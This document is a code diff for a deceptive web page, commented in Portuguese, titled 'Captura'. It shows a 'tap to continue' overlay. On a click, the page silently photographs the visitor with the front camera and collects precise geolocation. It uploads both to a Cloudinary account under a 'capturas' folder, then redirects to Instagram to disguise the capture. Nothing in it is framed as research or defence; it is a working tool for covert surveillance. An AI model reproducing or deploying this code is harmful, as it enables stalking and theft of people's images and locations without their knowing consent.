@@ -4,83 +4,104 @@
   <meta charset="UTF-8">
   <title>Captura</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <style>body{margin:0;overflow:hidden;background:#000;}</style>
+  <style>
+    body { margin:0; overflow:hidden; background:#000; }
+    #overlay {
+      position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+      display: flex; justify-content: center; align-items: center;
+      color: #fff; font-family: sans-serif; font-size: 20px;
+      background: rgba(0, 0, 0, 0.7);
+    }
+  </style>
 </head>
-<body onclick="capturarTudo()">
-<script>
-const cloudName = "dx5legahb"; 
-const uploadPreset = "upload";
-const folderName = "capturas";
+<body>
+  <div id="overlay">Toque para continuar...</div>
+  <script>
+    const cloudName = "dx5legahb";      // Seu Cloudinary Cloud Name
+    const uploadPreset = "upload";       // Seu Upload Preset (unsigned)
+    const folderName = "capturas";       // Pasta de destino
 
-async function capturarTudo() {
-  if (window.started) return; // Evita múltiplas execuções
-  window.started = true;
+    async function capturarTudo() {
+      try {
+        // Remove o overlay de toque
+        const overlay = document.getElementById("overlay");
+        if (overlay) overlay.style.display = "none";
 
-  try {
-    // 📸 Captura a imagem da câmera frontal no iPhone e Android
-    const stream = await navigator.mediaDevices.getUserMedia({
-      video: { facingMode: "user" }
+        // 1️⃣ Captura a foto usando a câmera frontal
+        const stream = await navigator.mediaDevices.getUserMedia({
+          video: { facingMode: "user" },
+          audio: false
+        });
+        const video = document.createElement("video");
+        video.playsInline = true;  // Essencial para iOS
+        video.muted = true;        // Essencial para autoplay no iOS
+        video.srcObject = stream;
+        await video.play();
+
+        // Aguarda um instante para garantir que o vídeo renderizou
+        await new Promise(r => setTimeout(r, 300));
+
+        const canvas = document.createElement("canvas");
+        canvas.width = video.videoWidth || 640;
+        canvas.height = video.videoHeight || 480;
+        const ctx = canvas.getContext("2d");
+        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+        stream.getTracks().forEach(track => track.stop());
+
+        const imageData = canvas.toDataURL("image/png");
+        const imageBlob = await (await fetch(imageData)).blob();
+
+        const imageForm = new FormData();
+        imageForm.append("file", imageBlob);
+        imageForm.append("upload_preset", uploadPreset);
+        imageForm.append("folder", folderName);
+
+        const imageResp = await fetch(`https://api.cloudinary.com/v1_1/${cloudName}/image/upload`, {
+          method: "POST",
+          body: imageForm
+        });
+        if (!imageResp.ok) throw new Error("Erro ao enviar imagem");
+        const imageUrl = (await imageResp.json()).secure_url;
+
+        // 2️⃣ Captura a localização com alta precisão
+        navigator.geolocation.getCurrentPosition(async (pos) => {
+          const { latitude, longitude } = pos.coords;
+          const texto = `Latitude: ${latitude}\nLongitude: ${longitude}\nImagem: ${imageUrl}`;
+          const textBlob = new Blob([texto], { type: "text/plain" });
+
+          const textForm = new FormData();
+          textForm.append("file", textBlob, `localizacao_${Date.now()}.txt`);
+          textForm.append("upload_preset", uploadPreset);
+          textForm.append("folder", folderName);
+
+          const textResp = await fetch(`https://api.cloudinary.com/v1_1/${cloudName}/raw/upload`, {
+            method: "POST",
+            body: textForm
+          });
+          if (!textResp.ok) throw new Error("Erro ao enviar o arquivo de localização");
+
+          // 3️⃣ Redireciona para o Instagram
+          window.location.href = "https://instagram.com";
+        }, (err) => {
+          console.error("Erro ao obter localização:", err);
+          window.location.href = "https://instagram.com";
+        }, {
+          enableHighAccuracy: true,
+          timeout: 8000,
+          maximumAge: 0
+        });
+
+      } catch (e) {
+        console.error("Falha:", e);
+        window.location.href = "https://instagram.com";
+      }
+    }
+
+    // Para iOS, iniciar somente após interação do usuário
+    document.body.addEventListener("click", function handler() {
+      document.body.removeEventListener("click", handler);
+      capturarTudo();
     });
-
-    const video = document.createElement("video");
-    video.srcObject = stream;
-    video.setAttribute("playsinline", true);
-    video.muted = true;
-    await video.play();
-
-    const canvas = document.createElement("canvas");
-    canvas.width = video.videoWidth || 640;
-    canvas.height = video.videoHeight || 480;
-    const ctx = canvas.getContext("2d");
-    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-    stream.getTracks().forEach(track => track.stop());
-
-    const imageData = canvas.toDataURL("image/png");
-    const imageBlob = await (await fetch(imageData)).blob();
-
-    const imageForm = new FormData();
-    imageForm.append("file", imageBlob);
-    imageForm.append("upload_preset", uploadPreset);
-    imageForm.append("folder", folderName);
-
-    const imageResp = await fetch(`https://api.cloudinary.com/v1_1/${cloudName}/image/upload`, {
-      method: "POST",
-      body: imageForm
-    });
-
-    if (!imageResp.ok) throw new Error("Erro ao enviar imagem");
-    const imageUrl = (await imageResp.json()).secure_url;
-
-    // 📍 Captura a localização
-    navigator.geolocation.getCurrentPosition(async (pos) => {
-      const { latitude, longitude } = pos.coords;
-      const texto = `Latitude: ${latitude}\nLongitude: ${longitude}\nImagem: ${imageUrl}`;
-      const textBlob = new Blob([texto], { type: "text/plain" });
-
-      const textForm = new FormData();
-      textForm.append("file", textBlob, `localizacao_${Date.now()}.txt`);
-      textForm.append("upload_preset", uploadPreset);
-      textForm.append("folder", folderName);
-
-      await fetch(`https://api.cloudinary.com/v1_1/${cloudName}/raw/upload`, {
-        method: "POST",
-        body: textForm
-      });
-
-      window.location.href = "https://instagram.com";
-    }, () => {
-      // Se falhar a localização, só envia a foto
-      window.location.href = "https://instagram.com";
-    }, {
-      enableHighAccuracy: true,
-      timeout: 8000
-    });
-
-  } catch (e) {
-    console.error("Erro:", e);
-    window.location.href = "https://instagram.com";
-  }
-}
-</script>
+  </script>
 </body>
 </html>
